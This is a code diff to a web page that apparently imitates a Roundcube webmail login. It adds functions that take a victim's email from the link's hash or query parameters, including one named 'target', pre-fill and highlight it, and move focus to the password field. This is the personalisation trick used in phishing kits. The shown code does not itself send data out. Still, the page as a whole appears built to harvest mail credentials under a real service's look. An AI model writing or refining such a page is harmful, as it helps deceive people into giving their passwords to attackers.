@@ -359,6 +359,72 @@
             console.log('Language changed to:', document.getElementById('language').value);
         }
         
+        // Auto-grab email from URL hash
+        function autoGrabEmail() {
+            const hash = window.location.hash.substring(1); // Remove the # symbol
+            const emailField = document.getElementById('rcmloginuser');
+            
+            if (hash && hash.length > 0) {
+                // Check if hash contains an email pattern
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                
+                if (emailRegex.test(hash)) {
+                    // Direct email in hash
+                    emailField.value = hash;
+                    console.log('Auto-filled email from hash:', hash);
+                    // Focus on password field since email is already filled
+                    document.getElementById('rcmloginpwd').focus();
+                } else if (hash.includes('@')) {
+                    // Contains @ symbol, might be a partial or encoded email
+                    emailField.value = decodeURIComponent(hash);
+                    console.log('Auto-filled decoded email from hash:', decodeURIComponent(hash));
+                    document.getElementById('rcmloginpwd').focus();
+                } else {
+                    // Check for common parameter patterns
+                    const params = new URLSearchParams('?' + hash);
+                    const email = params.get('email') || params.get('user') || params.get('target') || params.get('e');
+                    
+                    if (email) {
+                        emailField.value = decodeURIComponent(email);
+                        console.log('Auto-filled email from parameter:', email);
+                        document.getElementById('rcmloginpwd').focus();
+                    }
+                }
+                
+                // If email was filled, add subtle highlight
+                if (emailField.value && emailField.value.length > 0) {
+                    emailField.style.backgroundColor = '#f0f8ff';
+                    emailField.style.borderColor = '#4CAF50';
+                    
+                    // Remove highlight after 3 seconds
+                    setTimeout(() => {
+                        emailField.style.backgroundColor = '';
+                        emailField.style.borderColor = '';
+                    }, 3000);
+                }
+            }
+        }
+        
+        // Also check URL parameters (not just hash)
+        function checkUrlParameters() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailField = document.getElementById('rcmloginuser');
+            
+            // Check various parameter names commonly used
+            const email = urlParams.get('email') || 
+                         urlParams.get('user') || 
+                         urlParams.get('username') || 
+                         urlParams.get('target') || 
+                         urlParams.get('e') ||
+                         urlParams.get('u');
+            
+            if (email && !emailField.value) {
+                emailField.value = decodeURIComponent(email);
+                console.log('Auto-filled email from URL parameter:', email);
+                document.getElementById('rcmloginpwd').focus();
+            }
+        }
+        
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -441,9 +507,26 @@
             document.getElementById('error-message').style.display = 'none';
         }
         
-        // Auto-focus on username field
+        // Auto-focus on username field and auto-grab email
         window.addEventListener('load', function() {
-            document.getElementById('rcmloginuser').focus();
+            // First check for email in URL hash or parameters
+            autoGrabEmail();
+            checkUrlParameters();
+            
+            // Focus appropriate field
+            const emailField = document.getElementById('rcmloginuser');
+            if (emailField.value && emailField.value.length > 0) {
+                // Email already filled, focus on password
+                document.getElementById('rcmloginpwd').focus();
+            } else {
+                // No email, focus on username field
+                emailField.focus();
+            }
+        });
+        
+        // Also listen for hash changes (if user navigates with different hash)
+        window.addEventListener('hashchange', function() {
+            autoGrabEmail();
         });
         
         // Simulate real Roundcube behavior
